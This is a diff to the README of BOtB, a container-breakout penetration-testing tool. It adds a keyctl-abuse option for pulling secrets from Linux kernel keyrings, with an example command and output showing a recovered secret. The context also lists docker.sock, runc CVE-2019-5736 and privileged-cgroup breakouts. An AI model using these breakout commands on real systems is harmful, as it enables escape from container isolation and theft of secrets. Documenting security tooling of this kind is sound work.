@@ -14,6 +14,7 @@ BOtB is a CLI tool which allows you to:
 - Perform a container breakout via exposed Docker daemons (docker.sock)
 - Perform a container breakout via CVE-2019-5736
 - Perform a privileged container breakout via enabled CAPS and SYSCALLS
+- Extract data from Linux Kernel Keyrings via abusing the Keyctl syscall through permissive seccomp profiles
 - Identify Kubernetes Service Accounts secrets and attempt to use them
 - Identify metadata services endpoints i.e http://169.254.169.254, http://metadata.google.internal/ and http://100.100.100.200/
 - Scrape metadata info from GCP metadata endpoints
@@ -55,7 +56,7 @@ make
 # Usage
 BOtB can be compiled into a binary for the targeted platform and supports the following usage
 ```
-Usage of ./botb:
+./botb-linux-amd64 -h
 -aggr string
         Attempt to exploit RuncPWN (default "nil")
   -always-succeed
@@ -78,12 +79,18 @@ Usage of ./botb:
         Attempt to hijack binaries on host (default "nil")
   -k8secrets
         Identify and Verify K8's Secrets
+  -keyMax int
+         Maximum key id range (default 100000000) and max system value is 999999999 (default 100000000)
+  -keyMin int
+         Minimum key id range (default 1) (default 1)
   -metadata
         Attempt to find metadata services
   -path string
         Path to Start Scanning for UNIX Domain Sockets (default "/")
   -pwn-privileged string
         Provide a command payload to try exploit --privilege CGROUP release_agent's (default "nil")
+  -pwnKeyctl
+        Abuse keyctl syscalls and extract data from Linux Kernel keyrings
   -recon
         Perform Recon of the Container ENV
   -region string
@@ -112,6 +119,47 @@ BOtB can also be instructed to load settings from a YAML file via the config par
 ```
 
 The following usage examples will return a Exit Code > 0 by default when an anomaly is detected, this is depicted by "echo $?" which shows the exit code of the last executed command.
+
+### Identify and Extract Linux Kernel Keyring Secrets that have not been properly protected
+More info from the original author here https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/
+```
+#./botb-linux-amd64 -pwnKeyctl=true -keyMin=0 -keyMax=100000000
+[+] Break Out The Box
+[*] Attempting to Identify and Extract Keyring Values
+[!] WARNING, this can be resource intensive and your pod/container process may be killed, iterate over min and max with 100000000 increments to be safe
+[!] Subkey description for key [251133632]: user;0;0;3f010000;brompwnie_secret
+[!] Output {
+ "KeyId": 13738777,
+ "Valid": true,
+ "Name": "_ses.e326b8816c24d0ddda6c2c82ecf62ea2302a7239fce2fd104775d154a97fa3d6",
+ "Type": "keyring",
+ "Uid": "0",
+ "Gid": "0",
+ "Perms": "3f1b0000",
+ "String_Content": "\ufffd\ufffd\ufffd\u000e",
+ "Byte_Content": "wP73Dg==",
+ "Comments": null,
+ "Subkeys": [
+  {
+   "KeyId": 251133632,
+   "Valid": true,
+   "Name": "brompwnie_secret",
+   "Type": "user",
+   "Uid": "0",
+   "Gid": "0",
+   "Perms": "3f010000",
+   "String_Content": "thetruthisialsoreallyliketrees",
+   "Byte_Content": "dGhldHJ1dGhpc2lhbHNvcmVhbGx5bGlrZXRyZWVz",
+   "Comments": null,
+   "Subkeys": null,
+   "Output": ""
+  }
+ ],
+ "Output": ""
+}
+[+] Finished
+```
+
 
 ### Identify and Verify mounted Kubernetes Service Account Secrets
 ```
@@ -463,6 +511,8 @@ This tool would not be possible without the contribution of others in the commun
 - https://github.com/singe/container-breakouts
 - https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
 - https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/
+- https://github.com/antitree/keyctl-unmask#keyctl-unmask
+- https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/
 
 # Talks and Events
 BOtB is scheduled to be presented at the following:
